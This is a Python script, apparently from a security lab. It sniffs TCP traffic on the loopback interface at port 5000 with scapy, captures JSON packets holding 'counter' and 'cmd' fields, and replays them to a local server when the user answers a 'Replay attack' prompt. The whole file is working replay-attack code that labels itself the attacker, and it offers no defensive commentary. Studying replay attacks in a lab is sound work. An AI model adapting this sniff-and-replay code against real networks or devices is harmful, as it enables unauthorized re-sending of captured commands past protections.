import socket
import json
import threading
from scapy.all import sniff,TCP,Raw

HOST="127.0.0.1"
PORT=5000
captured_packet=None

def packet_capture(pkt):
    global captured_packet
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        try:
            payload=pkt[Raw].load.decode(errors="ignore")
            if "counter" in payload and "cmd" in payload:
                captured_packet=json.loads(payload.strip())
                print("\nPacket captured:")
                print(captured_packet)
        except:
            pass

def replay_packet():
    global captured_packet
    if not captured_packet:
        print("\nNo packet captured yet")
        return
    print("\nReplaying captured packet...\n")
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall((json.dumps(captured_packet) + "\n").encode())
        s.close()
        print("Packet sent to server")
    except Exception as e:
        print("Replay failed:", e)

def user_input():
    while True:
        choice=input("\nReplay attack (y/n)?: ")
        if choice.lower()=='y':
            replay_packet()
        elif choice.lower()=='n':
            print("Exiting attacker...")
            exit()

def start():
    print("Listening for packets...\n")
    # Run sniffing in background thread
    sniff_thread=threading.Thread(
        target=lambda:sniff(
            iface="lo",
            filter="tcp port 5000",
            prn=packet_capture,
            store=False
        ),
        daemon=True
    )
    sniff_thread.start()
    # Handle user input in main thread
    user_input()

if __name__=="__main__":
    start()
